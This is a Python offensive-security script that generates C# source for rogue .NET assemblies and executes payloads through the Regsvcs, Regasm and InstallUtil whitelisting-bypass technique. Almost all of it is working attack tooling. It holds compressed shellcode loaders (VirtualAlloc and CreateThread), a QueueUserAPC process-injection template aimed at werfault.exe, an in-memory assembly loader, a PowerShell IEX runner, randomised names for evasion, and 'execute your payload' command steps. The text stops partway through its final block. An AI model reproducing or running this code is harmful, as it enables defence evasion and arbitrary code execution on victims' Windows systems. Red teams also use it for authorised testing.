#!/usr/bin/python3
#
# Red-Teaming script that constructs C# code for Regsvcs/Regasm/InstallUtil code execution technique.
#
# Step 1: Generate source code file
#        cmd> python3 generateRogueDotNet.py -r payload.bin > program.cs
#
# Step 2: Compilate library .NET Assembly
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
# 
#   if you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used
#   to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script).
#   Then proper compilation command will be:
#
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
#
# Step 3: Code execution via Regsvcs, Regasm or InstallUtil:
#   x86:
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U rogue.dll 
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#   x64:
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U rogue.dll 
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import re
import os
import io
import sys
import gzip
import base64
import string
import struct
import random
import binascii
import pefile
import argparse
import tempfile
import subprocess

COMPILER_BASE = r'%WINDIR%\\Microsoft.NET\\Framework<ARCH>\\<VER>\\csc.exe'

TYPES_NOT_NEEDING_INPUT_FILE = (
  'run-command', 'exec'
)

COMPILERS = {
  'v2' : r'v2.0.50727',
  'v4' : r'v4.0.30319',
}

decompressionFuncs = '''
        public static long CopyTo(Stream source, Stream destination) {
            byte[] buffer = new byte[2048];
            int bytesRead;
            long totalBytes = 0;
            while((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) {
                destination.Write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            return totalBytes;
        }

        public static byte[] DecompressString(string compressedText) {
            byte[] data = Convert.FromBase64String(compressedText);

            using (MemoryStream ms = new MemoryStream(data)) {
                using (GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress)) {
                    using (MemoryStream decompressed = new MemoryStream()) {
                        //gzip.CopyTo(decompressed);
                        CopyTo(gzip, decompressed);
                        return decompressed.ToArray();
                    }
                }
            }
        }
'''

class ShellCommandReturnedError(Exception):
    pass

def shell2(cmd, alternative = False, stdErrToStdout = False, surpressStderr = False):
    CREATE_NO_WINDOW = 0x08000000
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    outs = ''
    errs = ''
    if not alternative:
        out = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            startupinfo=si, 
            creationflags=CREATE_NO_WINDOW,
            timeout=60
            )

        outs = out.stdout
        errs = out.stderr

    else:
        proc = subprocess.Popen(
            cmd,
            shell=True, 
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            startupinfo=si, 
            creationflags=CREATE_NO_WINDOW
        )
        try:
            outs, errs = proc.communicate(timeout=60)
            proc.wait()

        except TimeoutExpired:
            proc.kill()
            sys.stderr.write('WARNING! The command timed-out! Results may be incomplete\n')
            outs, errs = proc.communicate()

    status = outs.decode(errors='ignore').strip()

    if len(errs) > 0 and not surpressStderr:
        error = '''
Running shell command ({}) failed:

---------------------------------------------
{}
---------------------------------------------
'''.format(cmd, errs.decode(errors='ignore'))

        if stdErrToStdout:
            return error
            
        raise ShellCommandReturnedError(error)

    return status

def shell(cmd, alternative = False, output = False, surpressStderr = False):    
    out = shell2(cmd, alternative, stdErrToStdout = output, surpressStderr = surpressStderr)

    return out

def getCompressedPayload(filePath, returnRaw = False):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj = out, mode = 'w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())
        if returnRaw:
            return encoded

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode()
    )
    return powershell

def getPayloadCode(payload):
    return f'shellcode = "{payload}";'

    payloadCode = '\n'

    N = 50000
    codeSlices = map(lambda i: payload[i:i+N], range(0, len(payload), N))

    variables = []

    num = 1
    for code in codeSlices:
        payloadCode += f'string shellcode{num} = "{code}";\n'
        variables.append(f'shellcode{num}')
        num += 1

    concat = 'shellcode = ' + ' + '.join(variables) + ';\n'
    payloadCode += concat

    return payloadCode

def getSourceFileContents(
  module, 
  namespace, 
  method, 
  payload, 
  _format, 
  apc, 
  targetProcess, 
  dontUseNamespace = False, 
  _type = 'regasm',
  command = ''
):

    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(module) > 0:
        templateName = module

    namespaceName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(namespace) > 0:
        namespaceName = namespace

    methodName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
    if len(method) > 0:
        methodName = method

    payloadCode = payload

    if _type not in ['exec', 'run-command']:
      payloadCode = getPayloadCode(payload.decode())

    launchCode = ''

    if _type not in ['exec', 'run-command'] and _format == 'exe':

        exeLaunchCode = string.Template('''

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);

            Assembly asm = Assembly.Load(payload);
            MethodInfo method = asm.EntryPoint;
            object instance = asm.CreateInstance(method.Name);
            method.Invoke(instance, new object[] { new string[] { } }); 
            return true;
        }

        ''').safe_substitute(
            decompressionFuncs = decompressionFuncs,
            payloadCode = payloadCode
        )


        launchCode = exeLaunchCode

    elif _type not in ['exec', 'run-command'] and _format == 'raw':

        if not apc:
            shellcodeLoader = string.Template('''
        
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );

        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_RELEASE = 0x8000;

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payload, 0, funcAddr, payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            CloseHandle(hThread);
            VirtualFree(funcAddr, 0, MEM_RELEASE);

            return true;
        }                                           

        ''').safe_substitute(
        decompressionFuncs = decompressionFuncs,
        payloadCode = payloadCode
    )
        else:
            shellcodeLoader = string.Template('''

        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);
              
            string processpath = Environment.ExpandEnvironmentVariables(@"$targetProcess");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool success = CreateProcess(null, processpath, 
            IntPtr.Zero, IntPtr.Zero, false, 
            ProcessCreationFlags.CREATE_SUSPENDED, 
            IntPtr.Zero, null, ref si, out pi);

            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, payload.Length,MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,payload,payload.Length, out bytesWritten);

            IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
            resultBool = VirtualProtectEx(pi.hProcess,resultPtr, payload.Length,PAGE_EXECUTE_READ, out oldProtect);
            IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);

            IntPtr ThreadHandle = pi.hThread;
            ResumeThread(ThreadHandle);
            return true;
        }
        
        private static UInt32 MEM_COMMIT = 0x1000;
       
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        
        [Flags]
        public enum ProcessAccessFlags : uint
        {
          All = 0x001F0FFF,
          Terminate = 0x00000001,
          CreateThread = 0x00000002,
          VirtualMemoryOperation = 0x00000008,
          VirtualMemoryRead = 0x00000010,
          VirtualMemoryWrite = 0x00000020,
          DuplicateHandle = 0x00000040,
          CreateProcess = 0x000000080,
          SetQuota = 0x00000100,
          SetInformation = 0x00000200,
          QueryInformation = 0x00000400,
          QueryLimitedInformation = 0x00001000,
          Synchronize = 0x00100000
        }
        
        [Flags]
        public enum ProcessCreationFlags : uint
        {
          ZERO_FLAG = 0x00000000,
          CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
          CREATE_DEFAULT_ERROR_MODE = 0x04000000,
          CREATE_NEW_CONSOLE = 0x00000010,
          CREATE_NEW_PROCESS_GROUP = 0x00000200,
          CREATE_NO_WINDOW = 0x08000000,
          CREATE_PROTECTED_PROCESS = 0x00040000,
          CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
          CREATE_SEPARATE_WOW_VDM = 0x00001000,
          CREATE_SHARED_WOW_VDM = 0x00001000,
          CREATE_SUSPENDED = 0x00000004,
          CREATE_UNICODE_ENVIRONMENT = 0x00000400,
          DEBUG_ONLY_THIS_PROCESS = 0x00000002,
          DEBUG_PROCESS = 0x00000001,
          DETACHED_PROCESS = 0x00000008,
          EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
          INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
          public IntPtr hProcess;
          public IntPtr hThread;
          public uint dwProcessId;
          public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
          public uint cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public uint dwX;
          public uint dwY;
          public uint dwXSize;
          public uint dwYSize;
          public uint dwXCountChars;
          public uint dwYCountChars;
          public uint dwFillAttribute;
          public uint dwFlags;
          public short wShowWindow;
          public short cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
        }
        
        [Flags]
        public enum    ThreadAccess : int
        {
          TERMINATE           = (0x0001)  ,
          SUSPEND_RESUME      = (0x0002)  ,
          GET_CONTEXT         = (0x0008)  ,
          SET_CONTEXT         = (0x0010)  ,
          SET_INFORMATION     = (0x0020)  ,
          QUERY_INFORMATION       = (0x0040)  ,
          SET_THREAD_TOKEN    = (0x0080)  ,
          IMPERSONATE         = (0x0100)  ,
          DIRECT_IMPERSONATION    = (0x0200)
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
          int dwThreadId);
        
        [DllImport("kernel32.dll",SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          int nSize,
          out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
           Int32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true )]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
        );
        
         [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                     bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);
      
      ''').safe_substitute(
        decompressionFuncs = decompressionFuncs,
        templateName = templateName,
        payloadCode = payloadCode,
        targetProcess = targetProcess
    )

        launchCode = shellcodeLoader

    elif _type not in ['exec', 'run-command']:
        powershellLaunchCode = string.Template('''
        $decompressionFuncs

        public static bool Execute() {

            string shellcode = "";
            $payloadCode
            byte[] payload = DecompressString(shellcode);
            string decoded = System.Text.Encoding.UTF8.GetString(payload);

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(decoded);
            pipeline.Invoke();

            runspace.Close();
            return true;
        }      

        ''').safe_substitute(
            decompressionFuncs = decompressionFuncs,
            payload2 = base64.b64encode(payload.encode()).decode()
        )

        launchCode = powershellLaunchCode

    namespaceStart = 'namespace ' + namespaceName + ' {'
    namespaceStop = '}'

    if dontUseNamespace:
      namespaceStart = namespaceStop = ''

    assemblyAdditions1 = '''

/*
    Author: Casey Smith, Twitter: @subTee
    Customized by: Mariusz B. / mgeeky, <mb@binary-offensive.com>
    License: BSD 3-Clause

    Step 1: Create Your Strong Name Key -> key.snk

        $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
        $Content = [System.Convert]::FromBase64String($key)
        Set-Content key.snk -Value $Content -Encoding Byte

    Step 2: Compile source code:
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs

    Step 3: Execute your payload!
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 

        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
        %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll

        %WINDIR%\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#       %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
*/


'''
    assemblyAdditions2 = '''

        // This executes if registration is successful
        [ComRegisterFunction]
        public static void RegisterClass( string key )
        {
            Execute();
        }
        
        // This executes if registration fails
        [ComUnregisterFunction]
        public static void UnRegisterClass( string key )
        {
            Execute();
        }

'''

    assemblyAdditions3 = string.Template('''

    [System.ComponentModel.RunInstaller(true)]
    public class ForInstallUtil : System.Configuration.Install.Installer
    {
        // This executes during InstallUtil /U invocation
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            $templateName.Execute();
        }
    }

''').safe_substitute(templateName = templateName )

    assemblyAdditions4 = ' : ServicedComponent'

    if _type != 'regasm':
      assemblyAdditions1 = assemblyAdditions2 = ''
      assemblyAdditions3 = assemblyAdditions4 = ''

    if _type == 'exec':
      launchCode = '''

      public static bool Execute() {
          string fullPath = @"<CMD>";
          ProcessStartInfo psi = new ProcessStartInfo();
          psi.FileName = Path.GetFileName(fullPath);
          psi.WorkingDirectory = Path.GetDirectoryName(fullPath);

          string args = "";
          if(fullPath[0] == '"')
          {
              int pos = fullPath.IndexOf("\\"", 1);
              if(pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1, pos));

                  if (pos + 2 < fullPath.Length && fullPath[pos + 2] == ' ') 
                  {
                      args = fullPath.Substring(pos + 2);
                  }
              }
              else
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(1));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(1));
              }
          }
          else 
          {
              int pos = fullPath.IndexOf(" ");
              if (pos != -1)
              {
                  psi.FileName = Path.GetFileName(fullPath.Substring(0, pos));
                  psi.WorkingDirectory = Path.GetDirectoryName(fullPath.Substring(0, pos));

                  if (pos + 1 < fullPath.Length)
                  {
                      args = fullPath.Substring(pos + 1);
                  }
              }
          }

          MessageBox.Show("filename: (" + psi.FileName + "), cwd: (" + psi.WorkingDirectory + "), args: (" + args + ")");
          psi.Arguments = args;
          Process.Start(psi);

          return true;
      }

'''.replace('<CMD>', payloadCode)

    elif _type == 'run-command':
      launchCode = '''

      public static bool Execute() {
          return true;
      }

      public static bool Execute(string command) {
          if(!String.IsNullOrEmpty(command)) {
            Process.Start(Environment.ExpandEnvironmentVariables(command));
            return true;
          }
          return false;
      }

'''.replace('<CMD>', payloadCode)

    template = string.Template('''

$assemblyAdditions1

using System.Windows.Forms;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
//using Microsoft.Build.Utilities;
using System;
using System.Diagnostics;
using System.Reflection;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Text;


$namespaceStart
  
    [ComVisible(true)]
    public class $templateName $assemblyAdditions4
    {
        public $templateName() 
        { 
            Execute();
        }

        public void $methodName(string command)
        {
            Execute($runCommand);
        }

        $assemblyAdditions2

        $launchCode           
    }

    $assemblyAdditions3

$namespaceStop

''').safe_substitute(
        namespaceStart = namespaceStart,
        launchCode = launchCode,
        templateName = templateName,
        assemblyAdditions1 = assemblyAdditions1,
        assemblyAdditions2 = assemblyAdditions2,
        assemblyAdditions3 = assemblyAdditions3,
        assemblyAdditions4 = assemblyAdditions4,
        runCommand = 'command' if _type == 'run-command' else '',
        methodName = methodName,
        namespaceStop = namespaceStop
    )

    return template, templateName

def detectFileIsExe(filePath, forced = False):
    try:
        pe = pefile.PE(filePath)
        return True
    except pefile.PEFormatError as e:
        return False


def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile|cmdline>')
    parser.add_argument('inputFile', help = 'Input file to embedded into C# source code for --type regasm|plain. If --type exec was given, this parameter specifies command line to execute by the resulting assembly (environment variables will get expanded). May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')

    parser.add_argument('-t', '--type', choices=['regasm', 'plain', 'exec', 'run-command'], help = 'Specifies type of source code template to choose from while generating rogue .NET assembly. "regasm" - generates a template compatible with Regasm/Regsvcs/InstallUtil code execution primitives, "plain" - just a simple plain assembly with embedded shellcode/ps1/exe, "exec" - a simple shell command execution assembly which takes a command specified in "inputFile|cmdline" required parameter and embeds it hardcoded into the code, "run-command" exposes a method named --method which takes one string parameter being a command to run. Default: regasm')
    parser.add_argument('-c', '--compile', choices=['nocompile', 'x86', 'x64'], default='nocompile', help = 'Compile the source code using x86 or x64 csc.exe and generate output EXE/DLL file depending on --output extension. Default: nocompile - meaning the script will only produce .cs source code rather than compiled binary file.')
    parser.add_argument('-o', '--output', metavar='PATH', default='', type=str, help = 'Output path where to write generated script. Default: stdout')
    parser.add_argument('-s', '--namespace', metavar='NAME', default='ProgramNamespace', type=str, help = 'Specifies custom C# module namespace for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: ProgramNamespace.')
    parser.add_argument('-n', '--module', metavar='NAME', default='Program', type=str, help = 'Specifies custom C# module name for the generated Task (for needs of shellcode loaders such as DotNetToJScript or Donut). Default: Program.')
    parser.add_argument('-m', '--method', metavar='NAME', default='Foo', type=str, help = 'Specifies method name that could be used by DotNetToJS and alike deserialization techniques to invoke our shellcode. Default: Foo')
    parser.add_argument('-e', '--exe', action='store_true', 
        help = 'Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!')
    parser.add_argument('-r', '--raw', action='store_true', help = 'Specified input file is a raw Shellcode to be injected in self process in a separate Thread (VirtualAlloc + CreateThread)')
    parser.add_argument('--dotnet-ver', choices=['v2', 'v4'], default='v2', help='Use specific .NET version for compilation (with --compile given). Default: v2')
    parser.add_argument('--queue-apc', action='store_true', 
        help = 'If --raw was specified, generate C# code template with CreateProcess + WriteProcessMemory + QueueUserAPC process injection technique instead of default CreateThread.')
    parser.add_argument('--target-process', metavar='PATH', default=r'%windir%\system32\werfault.exe', 
        help = r'This option specifies target process path for remote process injection in --queue-apc technique. May use environment variables. May also contain command line for spawned process, example: --target-process "%%windir%%\system32\werfault.exe -l -u 1234"')

    args = parser.parse_args()

    if args.exe and args.raw:
        sys.stderr.write('[!] --exe and --raw options are mutually exclusive!\n')
        sys.exit(-1)

    args.target_process = args.target_process.replace("^%", '%')

    return args

def main(argv):
    sys.stderr.write('''
        :: Rogue .NET Source Code Generation Utility
        Comes with a few hardcoded C# code templates and an easy wrapper around csc.exe compiler
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

''')
    if len(argv) < 2:
        print('Usage: ./generateRogueDotNet.py <inputFile|cmdline>')
        sys.exit(-1)

    args = opts(argv)

    _format = 'powershell'

    if len(args.inputFile) > 0 and not os.path.isfile(args.inputFile) and args.type not in TYPES_NOT_NEEDING_INPUT_FILE:
        sys.stderr.write('[?] Input file does not exists.\n\n')
        return False

    if args.type not in TYPES_NOT_NEEDING_INPUT_FILE:
      if args.exe:
          if not detectFileIsExe(args.inputFile, args.exe):
              sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')
              return False

          _format = 'exe'
          sys.stderr.write('[?] File recognized as PE/EXE.\n\n')
          with open(args.inputFile, 'rb') as f:
              payload = f.read()

      elif args.raw:
          _format = 'raw'
          sys.stderr.write('[?] File specified as raw Shellcode.\n\n')
          with open(args.inputFile, 'rb') as f:
              payload = f.read()

      else:
          sys.stderr.write('[?] File not recognized as PE/EXE.\n\n')

          if args.inputFile.endswith('.exe'):
              return False
    
      payload = getCompressedPayload(args.inputFile, _format != 'powershell')
    else:
      payload = args.inputFile

    output, templateName = getSourceFileContents(
      args.module, 
      args.namespace, 
      args.method, 
      payload, 
      _format, 
      args.queue_apc, 
      args.target_process, 
      dontUseNamespace = False, 
      _type = args.type
    )

    management = ' /r:System.Management.Automation.dll /r:Microsoft.Build.Framework.dll'

    if args.compile != 'nocompile':
        if not args.output:
            print('[!] --output must be specified to compile file.')
            sys.exit(1)

        srcfile = ''
        with tempfile.NamedTemporaryFile() as f:
            srcfile = f.name + '.cs'

        target = 'winexe'
        if args.output.lower().endswith('.dll'):
            target = 'library'
        else:
            output = output.replace('public ' + templateName + '()', 'static public void Main(String[] args)')


        with open(srcfile, 'w') as f:
            f.write(output)

        p = COMPILER_BASE.replace('<VER>', COMPILERS[args.dotnet_ver])

        if args.compile == 'x64':
          p = p.replace('<ARCH>', '64')
        else:
          p = p.replace('<ARCH>', '')

        if args.type == 'regasm':
          cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:{} /keyfile:key.snk {}'.format(
              management, target, args.output, srcfile
          )
        else:
          cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:{} {}'.format(
              management, target, args.output, srcfile
          )

        if os.path.isfile(args.output):
          os.remove(args.output)

        print('Compiling as .NET ' + COMPILERS[args.dotnet_ver] + ':\n\t' + cmd + '\n')
        out = shell(os.path.expandvars(cmd))
        print(out)

        if os.path.isfile(args.output):
            print('[+] Success')
        else:
            return 1

    else:
        if len(args.output) > 0:
            with open(args.output, 'w') as f:
                f.write(output)
        else:
            print(output)

    commands = '''

=====================================
NEXT STEPS:

Step 1: Create Your Strong Name Key -> key.snk (or use the one provided in this directory)

    $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
    $Content = [System.Convert]::FromBase64String($key)
    Set-Content key.snk -Value $Content -Encoding Byte

Step 2: Compile source code:
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll{} /target:library /out:rogue.dll /keyfile:key.snk program.cs

Step 3: Execute your payload!
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll

    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 

    %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    '''.format(management)

    if 'PROGRAMFILES(X86)' in os.environ:
        commands = commands.replace('Framework\\', 'Framework64\\')

    if args.type == 'regasm':
